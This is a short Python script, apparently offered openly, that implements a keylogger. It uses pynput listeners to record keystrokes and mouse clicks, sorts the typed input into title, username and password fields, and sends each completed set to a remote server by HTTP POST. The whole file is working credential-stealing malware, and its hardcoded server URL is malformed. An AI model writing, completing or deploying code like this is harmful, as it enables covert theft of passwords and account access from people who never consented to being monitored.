from pynput import keyboard, mouse 
from datetime import datetime
import requests

SERVER_URL = "http://10.10.1.25000/report"

type_chars = []
form_data = {}
form_counter = 1
field_index = 0
is_login_page = True

def save_form(form_data_local, form_id):
  timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
  date_to_send = {
    'timestamp': timestamp,
    'form_id': form_id,
    'data': form_data_local
  }
  try:
    requests.post(SERVER_URL, json=date_to_send, timeout=5)
    print(f"[+] Form {form_id} saved successfully")
  except Exception as e:
    print(f"[-] Failed to save form {form_id}: {e}")
    
def submit_field():
  global type_chars, form_data, form_counter, field_index
  input_text = ''.join(type_chars).strip()
  type_chars.clear()
  if not input_text:
    return
  
  if field_index == 0:
    form_data['title'] = input_text
  elif field_index == 1:
    form_data['username'] = input_text
  else:
    form_data['password'] = form_data.get('password', '') + input_text
    
  field_index += 1
  
  if all(k in form_data for k in ("title", "username", "password")):
    save_form(form_data.copy(), f"form {form_counter}")
    form_data.clear()
    field_index = 0
    form_counter += 1
    
def on_press(key):
  try:
    if not is_login_page:
      return
    if hasattr(key, 'char') and key.char is not None:
      type_chars.append(key.char)
    elif key == keyboard.Key.enter or key == keyboard.Key.tab:
      submit_field()
    elif key == keyboard.Key.backspace and type_chars:
      type_chars.pop()
  except:
    pass
  
def on_click(x, y, button, pressed):
  if pressed and type_chars:
    submit_field()
    
def start_keylogger():
  keyboard.Listener(on_press=on_press).start()
  mouse.Listener(on_click=on_click).start()